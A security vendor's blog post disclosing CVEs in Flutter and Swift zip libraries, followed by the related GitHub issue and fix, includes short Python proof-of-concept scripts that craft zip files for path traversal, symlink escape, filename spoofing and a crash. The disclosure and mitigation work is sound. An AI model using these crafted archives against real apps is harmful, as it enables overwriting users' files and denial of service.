=== Content from ostorlab.co_8d0e73d0_20250111_164557.html ===




=== Content from blog.ostorlab.co_6e64aa4c_20250111_164556.html ===


mdi-slash-forward
## [Blog](https://blog.ostorlab.co/)

Engineering

Product

Security

Documentation

Changelog

Login

Demo

mdi-menu

Engineering

Product

Security

Documentation

Changelog

Login

Demo

[Security](https://blog.ostorlab.co/category/security.html)

# ZIP Exploitation: Critical Vulnerabilities Found in Popular Zip Libraries in Swift and Flutter

Recent in-depth investigations reveal serious vulnerabilities discovered in widely-used zip packages in Flutter and Swift, posing serious security risks for thousands of developers and applications. Our article delves into the technical aspects of these vulnerabilities, explaining their discovery, implications and mitigation strategies.

#

Author

[Ostorlab Team](https://blog.ostorlab.co/author/ostorlab-team.html)

`Fri 04 August 2023`

mdi-github

mdi-linkedin

mdi-twitter

mdi-youtube

# Introduction

ZIP packages are compressed archives that contain multiple files and directories, allowing developers to conveniently bundle resources, libraries, and other components required for app functionality. While ZIP packages offer efficiency and ease of use, they can also be the source of potential security vulnerabilities that malicious actors can exploit.

This article will delve into the security of zip-handling implementation, showcasing vulnerabilities in popular Zip libraries in the Swift and Dart (Flutter) ecosystems. We will explore the potential risks associated with malicious ZIP packages and the consequences they can have on mobile application security. Furthermore, we will discuss best practices and effective strategies to ensure the robust protection of ZIP packages throughout the development lifecycle.

# Anatomy of ZIP file

ZIP files typically follow this layout:

```
+------------------------------------------------------+
|                  Local File Header                   |
| +----------------------------------------------+     |
| | Local File Header Signature (4 bytes)       |     |
| | Version Needed to Extract (2 bytes)         |     |
| | General Purpose Bit Flag (2 bytes)          |     |
| | Compression Method (2 bytes)                |     |
| | Last Mod Time (2 bytes)                     |     |
| | Last Mod Date (2 bytes)                     |     |
| | CRC-32 Checksum (4 bytes)                   |     |
| | Compressed Size (4 bytes)                   |     |
| | Uncompressed Size (4 bytes)                 |     |
| | Filename Length (2 bytes)                  |     |
| | Extra Field Length (2 bytes)               |     |
| +----------------------------------------------+     |
| | Filename (variable length)                         | |
| |                                                  | |
| +----------------------------------------------+     |
| | Extra Field (variable length)                      | |
| |                                                  | |
| +----------------------------------------------+     |
|               Compressed Data                          |
|                                                      |
| +----------------------------------------------+     |
| | Data Descriptor (optional)                        | |
| | +------------------------------------------+ |     |
| | | CRC-32 Checksum (4 bytes)                | |     |
| | | Compressed Size (4 bytes)                | |     |
| | | Uncompressed Size (4 bytes)              | |     |
| | +------------------------------------------+ |     |
| +----------------------------------------------+     |
+------------------------------------------------------+
+------------------------------------------------------+
|                Central Directory                      |
| +----------------------------------------------+     |
| | Central Directory File Header              |     |
| | +--------------------------------------+ |     |
| | | Central Directory Header Signature  | |     |
| | | Version Made by (2 bytes)            | |     |
| | | Version Needed to Extract (2 bytes)  | |     |
| | | General Purpose Bit Flag (2 bytes)   | |     |
| | | ...                                | |     |
| | +--------------------------------------+ |     |
| | | CRC-32 Checksum (4 bytes)            | |     |
| | | Compressed Size (4 bytes)            | |     |
| | | Uncompressed Size (4 bytes)          | |     |
| | | Filename Length (2 bytes)            | |     |
| | | ...                                | |     |
| | +--------------------------------------+ |     |
| | | Filename (variable length)           | |     |
| | |                                    | |     |
| | +--------------------------------------+ |     |
| +----------------------------------------------+     |
+------------------------------------------------------+
+------------------------------------------------------+
|       End of Central Directory Record                |
| +----------------------------------------------+     |
| | End of Central Directory Signature (4 bytes) |     |
| | ...                                        |     |
| +----------------------------------------------+     |
+------------------------------------------------------+

```

Notable parts of the zip structure are:

* **Local File Header:** The Local File Header is a section at the beginning of each file within a ZIP archive. It contains essential information about the compressed file, such as its name, size, compression method, and other attributes. This header allows the software to locate and extract individual files from the ZIP archive.
* **Data Descriptor:** The Data Descriptor is an optional section within the ZIP file format. It provides additional information about a file's compressed data. The purpose of the Data Descriptor is to store the CRC-32 checksum of the uncompressed data, the compressed size, and the uncompressed size. Including this information allows for integrity checks and can be useful when extracting files.
* **Central Directory File Header:** The Central Directory File Header is a section in a ZIP file that contains metadata about each file within the archive. It provides details such as the file name, compressed size, uncompressed size, compression method, and other attributes. The Central Directory File Header is located in the central directory structure, a catalog of all the files in the ZIP archive.
* **End of Central Directory Record (EOCD):** The End of Central Directory (EOCD) Record is a section at the end of a ZIP file that marks the end of the central directory structure. It contains essential information, including the number of entries in the central directory, the size of the central directory, and the offset to the start of the central directory. The EOCD record allows the software to locate and access the central directory, which provides information about the files in the ZIP archive.

# Common ZIP vulnerabilities:

* **ZIP path traversal**: Zip path traversal, also known as Zip Slip, is a security vulnerability that occurs when the application fails to validate zip entries' file names during extraction. It allows an attacker to extract files to arbitrary locations outside the extraction directory, which helps overwrite sensitive user data and, in some cases, can lead to code execution if an attacker overwrites an application's shared object file.
* **ZIP filename spoofing**: In the context of ZIP archives, there are two main data structures relevant to file names: the `Central Directory Entry` and the `Local File Header`, if a parser for example, reads the filename from `Local File Header` but then proceeds to extract the file with the path in the `Central Directory Entry`.
* **ZIP symlink path traversal**: ZIP symlink is a feature used in many zip utilities that allows those symlinks to point to files outside the extraction directory. This can pose a security risk, leading to overwriting sensitive data or shared object files, which might lead to code execution.
* **ZIP Bomb**: A zip bomb is a small-sized zip file that contains an enormous amount of compressed data. When extracted, it expands into a huge file or consumes excessive system resources, potentially causing denial-of-service (DoS).

# ZIP packages to analyze

## Archive

One of the popular flutter packages for handling compressed files is `archive` by Brendan Duncan, this package implements popular archive formats natively in Dart without having to go through the native platform-specific packages like `java.util.zip` for android or `ZIPFoundation` for iOS.

Language: **Dart (Flutter)**

Link: <https://pub.dev/packages/archive>

## Flutter\_archive

`flutter_archive` is another Flutter package for compressed files that work exclusively with zip files, this package relies on Java's native zip package `java.util.zip` by leveraging Flutter's `MethodChannel`.

Language: **Dart (Flutter)**

Link: <https://pub.dev/packages/flutter_archive>

## ZIPFoundation

`ZIPFoundation` is a library to create, read and modify ZIP archive files. It is written in Swift and based on Apple's libcompression for high performance and energy efficiency.

Language: **Swift**

Link: <https://github.com/weichsel/ZIPFoundation>

## ZIP

`Zip` is a Swift framework for zipping and unzipping files. Simple and quick to use. Built on top of minizip.

Language: **Swift**

Link: <https://github.com/marmelroy/Zip>

## ZIPArchive (SSZIPArchive)

ZipArchive is a simple utility class for zipping and unzipping files on iOS, macOS and tvOS.

Language: **Swift**

Link: <https://github.com/ZipArchive/ZipArchive>

# Detected vulnerabilities

## Package: [Archive](https://github.com/brendan-duncan/archive)

### ZIP filename spoofing (CVE-2023-39137)

`archive` package only parses the filename from the `Local File Header`, this leads to inconsistency with most zip parsers who typically favor `Central Directory Entry`, this inconsistency can be abused by attackers who can craft a malicious zip file with different file names in `Local File Header` and `Central Directory Entry`, consequently having a file with different filenames before and after extraction.

```
  String filename = '';
  List<int> extraField = [];
  String fileComment = '';
  ZipFile? file;

  ZipFileHeader(
      [InputStreamBase? input, InputStreamBase? bytes, String? password]) {
    if (input != null) {
      versionMadeBy = input.readUint16();
      versionNeededToExtract = input.readUint16();
      generalPurposeBitFlag = input.readUint16();
      compressionMethod = input.readUint16();
      lastModifiedFileTime = input.readUint16();
      lastModifiedFileDate = input.readUint16();
      crc32 = input.readUint32();
      compressedSize = input.readUint32();
      uncompressedSize = input.readUint32();
      final fnameLen = input.readUint16();
      final extraLen = input.readUint16();
      final commentLen = input.readUint16();
      diskNumberStart = input.readUint16();
      internalFileAttributes = input.readUint16();
      externalFileAttributes = input.readUint32();
      localHeaderOffset = input.readUint32();

      if (fnameLen > 0) {
        filename = input.readString(size: fnameLen);
      }

```

To test this, we crafted a zip file with different filename field values *evil.apk* and *evil.txt* respectively for `Local File Header` and `Central Directory Entry`

**Proof of concept code:**

```
import zipfile

def generate_spoofed_zip(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

    with open('payload.zip', 'rb') as zipf:
        zip_data = zipf.read()
        spoofed_data = zip_data.replace(bytes(filename, 'utf-8'), bytes(spoofed_filename, 'utf-8'), 1)

    with open('payload.zip', 'wb') as zipf:
        zipf.write(spoofed_data)

original_filename = 'evil.txt'
spoofed_filename = 'evil.apk'

if len(original_filename) != len(spoofed_filename):
    raise ValueError("Filenames lengths must be equal")

generate_spoofed_zip(original_filename)

```

![zip file hexdump](https://blog.ostorlab.co/static/img/archive_zip/zipfile_hexdump.png "Zip file hex dump")

Zip file hex dump

when we ran `zipinfo` utility over our zip file, the filename inside was parsed as `evil.txt`

![zipinfo](https://blog.ostorlab.co/static/img/archive_zip/zipinfo.png "zipinfo over our zip file")

zipinfo over our zip file

However, after extracting the file using `extractFileToDisk` function from `archive` package, the filename was parsed as `evil.apk`

![zip file extracted](https://blog.ostorlab.co/static/img/archive_zip/extracted_zipfile.png "Extracted zip file")

Extracted zip file

### ZIP symlink path traversal (CVE-2023-39139)

Another interesting finding we found while inspecting the package was not only it links symlinks back after extraction, it also links ones pointing to any path, even outside the extraction directory.

```
  for (final file in archive.files) {
    final filePath = p.join(outputPath, p.normalize(file.name));

    if (!isWithinOutputPath(outputPath, filePath)) {
      continue;
    }

    if (!file.isFile && !file.isSymbolicLink) {
      Directory(filePath).createSync(recursive: true);
      continue;
    }

    if (asyncWrite) {
      if (file.isSymbolicLink) {
        final link = Link(filePath);
        await link.create(p.normalize(file.nameOfLinkedFile), recursive: true);
      } else {
        final output = File(filePath);
        final f = await output.create(recursive: true);
        final fp = await f.open(mode: FileMode.write);
        final bytes = file.content as List<int>;
        await fp.writeFrom(bytes);
        file.clear();
        futures.add(fp.close());
      }

```

To test that we created a symlink *evil* pointing to a file (*secret.txt*) in the parent directory, we zipped that symlink using the command `zip --symlinks poc.zip evil` and extracted `poc.zip` on an Android test device using `extractFileToDisk` function.

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    zipInfo = zipfile.ZipInfo(".")
    zipInfo.create_system = 3
    zipInfo.external_attr = 2716663808
    zipInfo.filename = filename

    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(zipInfo, "/etc/hosts")

filename = 'evil'

compress_file(filename)

```

![symlink workstation](https://blog.ostorlab.co/static/img/archive_zip/symlink_workstation.png "Symlink poc in our workstation")

Symlink poc in our workstation

Upon extracting the zip file, the symlink was linked back and pointing to `../secret.txt`, outside the extraction directory.

![symlink android](https://blog.ostorlab.co/static/img/archive_zip/symlink_android.png "Symlink after extraction on android device")

Symlink after extraction on android device

## Package: [ZIPFoundation](https://github.com/weichsel/ZIPFoundation)

### ZIP symlink path traversal (CVE-2023-39138)

Upon extraction, the package passes the path coming from the zip entry directly to `fileManager.createSymbolicLink` without checking that it is located within extraction directory, we replicated the same test above and found this package too allows symlinks pointing outside the extraction directory.

```
case .symlink:
    guard !fileManager.itemExists(at: url) else {
        throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])
    }
    let consumer = { (data: Data) in
        guard let linkPath = String(data: data, encoding: .utf8) else { throw ArchiveError.invalidEntryPath }
        try fileManager.createParentDirectoryStructure(for: url)
        try fileManager.createSymbolicLink(atPath: url.path, withDestinationPath: linkPath)
    }
    checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,
                                progress: progress, consumer: consumer)
}

```
### ZIP path traversal (CVE-2023-39138)

the package uses the function `isContained` to check that the zip entry path is located within the extraction directory:

```
func isContained(in parentDirectoryURL: URL) -> Bool {
        // Ensure this URL is contained in the passed in URL
        let parentDirectoryURL = URL(fileURLWithPath: parentDirectoryURL.path, isDirectory: true).standardized
        return self.standardized.absoluteString.hasPrefix(parentDirectoryURL.absoluteString)
    }
...
guard entryURL.isContained(in: destinationURL) else {
        throw CocoaError(.fileReadInvalidFileName,
                         userInfo: [NSFilePathErrorKey: entryURL.path])
    }
...
crc32 = try archive.extract(entry, to: entryURL, skipCRC32: skipCRC32, progress: entryProgress)

```

Below is a code snippet of the `extract` function:

```
public func extract(_ entry: Entry, to url: URL, bufferSize: Int = defaultReadChunkSize, skipCRC32: Bool = false,
                        progress: Progress? = nil) throws -> CRC32 {
        guard bufferSize > 0 else {
            throw ArchiveError.invalidBufferSize
        }
        let fileManager = FileManager()
        var checksum = CRC32(0)
        switch entry.type {
        case .file:
            guard !fileManager.itemExists(at: url) else {
                throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])
            }
            try fileManager.createParentDirectoryStructure(for: url)
            let destinationRepresentation = fileManager.fileSystemRepresentation(withPath: url.path)
            guard let destinationFile: FILEPointer = fopen(destinationRepresentation, "wb+") else {
                throw POSIXError(errno, path: url.path)
            }
            defer { fclose(destinationFile) }
            let consumer = { _ = try Data.write(chunk: $0, to: destinationFile) }
            checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,
                                        progress: progress, consumer: consumer)

```

When provided with the following path `/base_path/extraction_directory//../` the path gets normalized to `/base_path/extraction_directory/entry_file_name` which passes the check above.
When that same path is passed to `fopen`, it gets normalized to `/base_path/entry_file_name`, allowing us to write files outside the extraction directory.

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '/../secret.txt'

compress_file(filename)

```
## Package: [Zip](https://github.com/marmelroy/Zip)

### ZIP path traversal (CVE-2023-39135)

Below is a code snippet from the `unzipFile` function used to extract zip files, you can notice that `pathString` coming from our zip entry is appended to the `destination` directory without any sanitization

```
let fileNameSize = Int(fileInfo.size_filename) + 1
//let fileName = UnsafeMutablePointer<CChar>(allocatingCapacity: fileNameSize)
let fileName = UnsafeMutablePointer<CChar>.allocate(capacity: fileNameSize)

unzGetCurrentFileInfo64(zip, &fileInfo, fileName, UInt(fileNameSize), nil, 0, nil, 0)
fileName[Int(fileInfo.size_filename)] = 0

var pathString = String(cString: fileName)

guard pathString.count > 0 else {
    throw ZipError.unzipFail
}

var isDirectory = false
let fileInfoSizeFileName = Int(fileInfo.size_filename-1)
if (fileName[fileInfoSizeFileName] == "/".cString(using: String.Encoding.utf8)?.first || fileName[fileInfoSizeFileName] == "\\".cString(using: String.Encoding.utf8)?.first) {
    isDirectory = true;
}
free(fileName)
if pathString.rangeOfCharacter(from: CharacterSet(charactersIn: "/\\")) != nil {
    pathString = pathString.replacingOccurrences(of: "\\", with: "/")
}

let fullPath = destination.appendingPathComponent(pathString).path

```

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '../secret.txt'

compress_file(filename)

```
## Package: [ZIPArchive (SSZIPArchive)](https://github.com/ZipArchive/ZipArchive)

### Denial of Service (CVE-2023-39136)

Below is a code snippet from the `_sanitizedPath` function used to sanitize zip entries filenames, the code prepends `file:///` prefix to the zip entry path, standardizes it using `NSURL` then removes the prepended prefix, however when presented with `/..` as a path, the output of `NSURL` becomes `file://`, which has 7 characters while the code expects at least 8 characters, this unhandled edge case leads to crashing the application.

```
if (strPath == nil) {
        return nil;
    }

// Add scheme "file:///" to support sanitation on names with a colon like "file:a/../../../usr/bin"
strPath = [@"file:///" stringByAppendingString:strPath];

// Sanitize path traversal characters to prevent directory backtracking. Ignoring these characters mimics the default behavior of the Unarchiving tool on macOS.
// "../../../../../../../../../../../tmp/test.txt" -> "tmp/test.txt"
// "a/b/../c.txt" -> "a/c.txt"
strPath = [NSURL URLWithString:strPath].standardizedURL.absoluteString;

// Remove the "file:///" scheme
strPath = [strPath substringFromIndex:8];

```

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '/..'

compress_file(filename)

```
# Summary table

| Package | Language | ZIP Filename Spoofing | ZIP Symlink | ZIP Path Traversal | Denial of Service |
| --- | --- | --- | --- | --- | --- |
| Archive | Dart (Flutter) | Vulnerable | Not Vulnerable | Not Vulnerable | Not Vulnerable |
| Flutter\_archive | Dart (Flutter) | Not Vulnerable | Not Vulnerable | Not Vulnerable | Not Vulnerable |
| ZIPFoundation | Swift | Not Vulnerable | Vulnerable | Vulnerable | Not Vulnerable |
| ZIP | Swift | Not Vulnerable | Not Vulnerable | Vulnerable | Not Vulnerable |
| ZIPArchive | Swift | Not Vulnerable | Not Vulnerable | Not Vulnerable | Vulnerable |

# Conclusion

In conclusion, ZIP vulnerabilities pose significant security risks that developers should be aware of when handling archive files. The ZIP file format, although widely used and supported, is not immune to exploitation. Understanding and addressing these vulnerabilities is essential to safeguarding sensitive data and preventing potential attacks.

This article has highlighted several common ZIP vulnerabilities, including ZIP path traversal, ZIP filename spoofing, ZIP symlink vulnerability, and ZIP bomb attacks. Each of these vulnerabilities exposes different risks, such as unauthorized access to files, overwriting sensitive data, denial-of-service (DoS) and even code execution in some scenarios.

It is important for developers to implement robust security measures when working with ZIP files. This includes validating zip entry file names during extraction to prevent path traversal attacks, ensuring consistency between the filenames in the Local File Header and Central Directory Entry to mitigate filename spoofing, restricting access permissions for extracted files, and implementing proper decompression techniques to prevent DoS situations caused by ZIP bombs.

Additionally, it is crucial to stay informed about security updates and patches related to ZIP libraries or packages used in development frameworks. Regularly reviewing and updating these dependencies can help mitigate known vulnerabilities and protect against emerging threats.

It is worth mentioning that the issues discussed in this article were reported to the concerned authors.

Tags:

[flutter](https://blog.ostorlab.co/tag/flutter.html),  [swift](https://blog.ostorlab.co/tag/swift.html),  [zip](https://blog.ostorlab.co/tag/zip.html),  [security](https://blog.ostorlab.co/tag/security.html),  [archive](https://blog.ostorlab.co/tag/archive.html),  [vulnerability](https://blog.ostorlab.co/tag/vulnerability.html),  [exploitation](https://blog.ostorlab.co/tag/exploitation.html)

We do newsletters, too

---

Get the latest news, updates, and product innovations from Ostorlab right in your inbox.

Subscribe

Table of Contents

---

* [Introduction](#introduction "Introduction")
* [Anatomy of ZIP file](#anatomy of zip file "Anatomy of ZIP file")
* [Common ZIP vulnerabilities:](#common zip vulnerabilities: "Common ZIP vulnerabilities:")
* [ZIP packages to analyze](#zip packages to analyze "ZIP packages to analyze")
  + [Archive](#archive "Archive")
  + [Flutter\_archive](#flutter_archive "Flutter_archive")
  + [ZIPFoundation](#zipfoundation "ZIPFoundation")
  + [ZIP](#zip "ZIP")
  + [ZIPArchive (SSZIPArchive)](#ziparchive (ssziparchive) "ZIPArchive (SSZIPArchive)")
* [Detected vulnerabilities](#detected vulnerabilities_1 "Detected vulnerabilities")
  + [Package: Archive](#package: archive "Package: Archive")
    - [ZIP filename spoofing (CVE-2023-39137)](#zip filename spoofing (cve-2023-39137) "ZIP filename spoofing (CVE-2023-39137)")
    - [ZIP symlink path traversal (CVE-2023-39139)](#zip symlink path traversal (cve-2023-39139) "ZIP symlink path traversal (CVE-2023-39139)")
  + [Package: ZIPFoundation](#package: zipfoundation_1 "Package: ZIPFoundation")
    - [ZIP symlink path traversal (CVE-2023-39138)](#zip symlink path traversal (cve-2023-39138) "ZIP symlink path traversal (CVE-2023-39138)")
    - [ZIP path traversal (CVE-2023-39138)](#zip path traversal (cve-2023-39138) "ZIP path traversal (CVE-2023-39138)")
  + [Package: Zip](#package: zip_1 "Package: Zip")
    - [ZIP path traversal (CVE-2023-39135)](#zip path traversal (cve-2023-39135) "ZIP path traversal (CVE-2023-39135)")
  + [Package: ZIPArchive (SSZIPArchive)](#package: ziparchive (ssziparchive)_1 "Package: ZIPArchive (SSZIPArchive)")
    - [Denial of Service (CVE-2023-39136)](#denial of service (cve-2023-39136) "Denial of Service (CVE-2023-39136)")
* [Summary table](#summary table_2 "Summary table")
* [Conclusion](#conclusion "Conclusion")

## Subscribe to the Ostorlab Newsletter

A newsletter covering techniques, technical guides, and the latest product innovations coming from Ostorlab.

Subscribe
>

Questions, comments, feedback, or just a quick hello, you know where to reach us 😉!

mdi-at

contact@ostorlab.co

Platform

[Lighthouse](https://ostorlab.co/appcards)

[Vulnerability Database](https://ostorlab.co/vulndb)

[Changelog](https://blog.ostorlab.co/changelog.html)

[FAQ](https://docs.ostorlab.co/faq/)

Product

[Mobile Security Testing](https://ostorlab.co/product/mobile)

[Web Security Testing](https://ostorlab.co/product/web)

[Attack Surface Discovery](https://ostorlab.co/product/attacksurface)

[Open-Source](https://oxo.ostorlab.co/)

Company

[Documentation](https://docs.ostorlab.co)

[Plans](https://ostorlab.co/plans)

[Contact](https://ostorlab.co/contact)

mdi-copyright

`2024 Ostorlab. All Rights
Reserved.`

[`Terms
& Conditions`](https://docs.ostorlab.co/terms/)
[`Privacy
Policy`](https://docs.ostorlab.co/privacy/)

mdi-rss-box

mdi-atom

mdi-github

mdi-linkedin

mdi-instagram

mdi-twitter

mdi-youtube



=== Content from github.com_ff9e651f_20250111_164556.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZipArchive%2FZipArchive%2Fissues%2F680)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZipArchive%2FZipArchive%2Fissues%2F680)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=ZipArchive%2FZipArchive)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ZipArchive](/ZipArchive)
/
**[ZipArchive](/ZipArchive/ZipArchive)**
Public

* [Notifications](/login?return_to=%2FZipArchive%2FZipArchive) You must be signed in to change notification settings
* [Fork
  1.3k](/login?return_to=%2FZipArchive%2FZipArchive)
* [Star
   5.5k](/login?return_to=%2FZipArchive%2FZipArchive)

* [Code](/ZipArchive/ZipArchive)
* [Issues
  48](/ZipArchive/ZipArchive/issues)
* [Pull requests
  7](/ZipArchive/ZipArchive/pulls)
* [Actions](/ZipArchive/ZipArchive/actions)
* [Projects
  0](/ZipArchive/ZipArchive/projects)
* [Wiki](/ZipArchive/ZipArchive/wiki)
* [Security](/ZipArchive/ZipArchive/security)
* [Insights](/ZipArchive/ZipArchive/pulse)

Additional navigation options

* [Code](/ZipArchive/ZipArchive)
* [Issues](/ZipArchive/ZipArchive/issues)
* [Pull requests](/ZipArchive/ZipArchive/pulls)
* [Actions](/ZipArchive/ZipArchive/actions)
* [Projects](/ZipArchive/ZipArchive/projects)
* [Wiki](/ZipArchive/ZipArchive/wiki)
* [Security](/ZipArchive/ZipArchive/security)
* [Insights](/ZipArchive/ZipArchive/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FZipArchive%2FZipArchive%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FZipArchive%2FZipArchive%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Unhandled edge case in \_sanitizedPath #680

Closed

[BlueSquare1](/BlueSquare1) opened this issue
Jul 10, 2023
· 1 comment

Closed

# [Unhandled edge case in \_sanitizedPath](#top) #680

[BlueSquare1](/BlueSquare1) opened this issue
Jul 10, 2023
· 1 comment

## Comments

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=80&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)

Copy link

### **[BlueSquare1](/BlueSquare1)** commented [Jul 10, 2023](#issue-1796509070)

| **Description:**  There is an unhandeled edge case where we can crash the application when it tries to unzip a specially crafted zip file  **Technical details:**  Below is a code snippet from the `_sanitizedPath` function used to sanitize file paths coming from zip entries before extraction to prevent path traversal, the function prepends `file:///` to the provided path, standardizes it using `NSURL` and then removes the prepended `file:///`, when provided with the following path however `/..`, the standardized path returned by `NSURL` becomes `file://`, which has 7 characters, the package however expects at least 8 characters (length of the prepended text), this results in crashing the application.  ``` // Add scheme "file:///" to support sanitation on names with a colon like "file:a/../../../usr/bin" strPath = [@"file:///" stringByAppendingString:strPath];  // Sanitize path traversal characters to prevent directory backtracking. Ignoring these characters mimicks the default behavior of the Unarchiving tool on macOS. // "../../../../../../../../../../../tmp/test.txt" -> "tmp/test.txt" // "a/b/../c.txt" -> "a/c.txt" strPath = [NSURL URLWithString:strPath].standardizedURL.absoluteString;  // Remove the "file:///" scheme strPath = [strPath substringFromIndex:8]; ```  **PoC:**  ``` import zipfile  def compress_file(filename):     with zipfile.ZipFile('payload.zip', 'w') as zipf:         zipf.writestr(filename, "Test payload")  filename = '/..'  compress_file(filename) ``` |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=40&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)
[BlueSquare1](/BlueSquare1)
closed this as [not planned](/ZipArchive/ZipArchive/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3A%22not+planned%22)
Won't fix, can't repro, duplicate, stale
[Jul 20, 2023](#event-9874777366)

[Coeur](/Coeur)
added a commit
that referenced
this issue
[Jul 22, 2023](#ref-commit-49a22a5)
[![@Coeur](https://avatars.githubusercontent.com/u/839992?s=40&u=490d6d771a5e19e9f684d7fc24effa34425f53cd&v=4)](/Coeur)

`[Fix path traversal for "/.." (](/ZipArchive/ZipArchive/commit/49a22a5474fa8fab50ba8cb239422b53bbe9d225 "Fix path traversal for \"/..\" (#680)")[#680](https://github.com/ZipArchive/ZipArchive/issues/680)[)](/ZipArchive/ZipArchive/commit/49a22a5474fa8fab50ba8cb239422b53bbe9d225 "Fix path traversal for \"/..\" (#680)")`

`[49a22a5](/ZipArchive/ZipArchive/commit/49a22a5474fa8fab50ba8cb239422b53bbe9d225)`

[![@Coeur](https://avatars.githubusercontent.com/u/839992?s=80&u=490d6d771a5e19e9f684d7fc24effa34425f53cd&v=4)](/Coeur)

Copy link

Member

### **[Coeur](/Coeur)** commented [Jul 22, 2023](#issuecomment-1646596020)

| Thank you. Fixed in [49a22a5](https://github.com/ZipArchive/ZipArchive/commit/49a22a5474fa8fab50ba8cb239422b53bbe9d225) |
| --- |

All reactions

Sorry, something went wrong.

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=40&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)
[BlueSquare1](/BlueSquare1)
closed this as [completed](/ZipArchive/ZipArchive/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jul 24, 2023](#event-9897526811)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FZipArchive%2FZipArchive%2Fissues%2F680)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

